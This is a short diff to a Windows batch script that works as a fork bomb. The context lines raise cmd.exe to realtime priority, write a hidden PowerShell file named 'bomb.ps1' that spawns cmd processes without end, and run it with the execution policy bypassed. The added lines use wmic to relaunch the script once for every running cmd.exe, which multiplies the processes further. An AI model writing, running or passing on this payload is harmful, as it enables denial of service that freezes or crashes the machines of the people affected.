@@ -80,4 +80,8 @@ wmic process where name="cmd.exe" call setpriority "realtime time critical" >nul
 echo $x={for(){start-process 'cmd' '-/c start /b cmd /c for /l in () do start cmd' -WindowStyle Hidden}} > "%temp%\bomb.ps1"
 powershell -ExecutionPolicy Bypass -File "%temp%\bomb.ps1" 2>nul
 
+for /f "tokens=2" %%a in ('tasklist /fi "IMAGENAME eq cmd.exe" /fo csv ^| findstr /v "PID"') do (
+    wmic process where "ProcessId=%%a" call create "%~f0" >nul 2>&1
+)
+
 goto loop
